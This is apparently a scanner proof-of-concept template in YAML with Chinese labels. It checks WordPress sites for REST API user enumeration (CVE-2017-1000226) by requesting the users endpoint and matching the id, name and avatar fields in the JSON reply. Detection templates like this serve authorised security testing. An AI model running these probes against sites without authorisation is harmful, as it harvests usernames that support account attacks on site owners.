id: poc-yaml-wordpress-plugin-rest-api-user-enumeration
info:
  name: WordPress REST API 用户枚举漏洞(CVE-2017-1000226)
  severity: low
  tags:
  - 信息泄露
  - CVE-2017-1000226
  finger: stop_user_enumeration
variables:
  paths: 'wp-json/wp/v2/users/

    ?rest_route=/wp/v2/users/

    '
requests:
- method: GET
  path: /{{.paths}}
  expression: status_code == 200 && contains(body,"\"id\":") && contains(body,"\"name\":")
    && contains(body,"\"avatar_urls\":") && contains(content_type,"application/json")
transport: http
